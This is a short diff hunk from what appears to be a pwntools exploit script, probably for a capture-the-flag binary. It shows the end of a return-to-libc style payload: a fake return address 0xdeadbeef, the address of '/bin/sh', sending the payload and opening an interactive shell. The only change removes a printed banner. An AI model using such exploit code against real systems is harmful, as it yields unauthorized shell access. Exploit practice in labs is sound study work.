@@ -48,6 +48,4 @@ payload2 += p32(0xdeadbeef) # Return address fasullo
 payload2 += p32(addr_bin_sh)
 
 r.sendline(payload2)
-
-print("\n" + "="*20 + " SHELL " + "="*20)
 r.interactive()
